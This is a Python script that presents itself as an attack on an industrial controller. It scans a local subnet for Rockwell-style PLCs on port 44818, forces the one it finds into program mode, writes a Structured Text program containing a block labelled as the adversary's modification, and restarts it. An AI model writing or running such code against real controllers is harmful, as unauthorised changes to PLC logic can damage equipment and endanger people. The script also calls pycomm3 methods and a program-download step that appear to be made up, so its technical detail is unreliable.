import pycomm3
import socket
import time

# Function to find the PLC's IP address
def find_plc_ip():
    # This is a simple example of finding the PLC's IP address.
    # In a real-world scenario, you might use a more sophisticated method.
    # For this example, we'll assume the PLC is on the same subnet and use a simple scan.
    network = '192.168.1.'  # Change this to your network
    for i in range(1, 255):
        ip = f"{network}{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 44818))  # Port 44818 is commonly used by Rockwell PLCs
            if result == 0:
                print(f"PLC found at {ip}")
                return ip
            sock.close()
        except Exception as e:
            print(f"Error scanning {ip}: {e}")
    return None

# Function to download a modified program to the PLC
def download_program_to_plc(plc_ip):
    try:
        # Connect to the PLC
        with pycomm3.LogixDriver(plc_ip) as plc:
            # Check if the PLC is in the correct mode (RUN or PROGRAM)
            if plc.get_plc_state() == 'RUN':
                print("PLC is in RUN mode. Switching to PROGRAM mode.")
                plc.set_plc_state('PROGRAM')
                time.sleep(2)  # Wait for the PLC to switch modes

            # Define the modified program
            modified_program = """
            // Variable declarations
            VAR
                START : BOOL := TRUE;
                STOP : BOOL := FALSE;
                Activate_FanA : BOOL;
                FanA_Timer : TIME;
                TON_1 : TON;
                TONOFF_1 : TONOFF;
                FanA_Off : BOOL;
                Tog_Off : BOOL;
                NewVariable : BOOL;
            END_VAR

            // Main program logic
            PROGRAM Prog1
                // Rung 1 - TONOFF Timer control for fan activation
                TONOFF_1(
                    IN := START AND NOT Tog_Off,
                    PT := T#10S,
                    PTOF := T#20S
                );
                Activate_FanA := TONOFF_1.Q;

                // Rung 2 & 3 - Fan and Green LED control
                IF Activate_FanA AND NOT Tog_Off THEN
                    _IO_EM_DO_02 := TRUE;  // Fan output
                    _IO_EM_DO_07 := TRUE;  // Green LED
                ELSE
                    _IO_EM_DO_02 := FALSE;
                    _IO_EM_DO_07 := FALSE;
                END_IF;

                // Rung 4 - Reset START when fan is active
                IF Activate_FanA THEN
                    START := FALSE;  // Reset operation
                END_IF;

                // Rung 5 - Timer for START signal
                TON_1(
                    IN := NOT START,
                    PT := T#20S
                );
                
                IF TON_1.Q THEN
                    START := TRUE;  // Set operation
                END_IF;

                // Rung 6 - FanA_Off control
                FanA_Off := START;

                // Rung 7 - Red LED control
                IF FanA_Off THEN
                    _IO_EM_DO_06 := TRUE;  // Red LED
                ELSE
                    _IO_EM_DO_06 := FALSE;
                END_IF;

                // Adversary's modification
                IF NewVariable THEN
                    _IO_EM_DO_08 := TRUE;  // Additional output
                ELSE
                    _IO_EM_DO_08 := FALSE;
                END_IF;

            END_PROGRAM
            """

            # Download the modified program
            plc.write(modified_program)

            # Switch the PLC back to RUN mode
            plc.set_plc_state('RUN')
            print("Program downloaded successfully and PLC switched back to RUN mode.")
    except Exception as e:
        print(f"Error downloading program: {e}")

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        download_program_to_plc(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()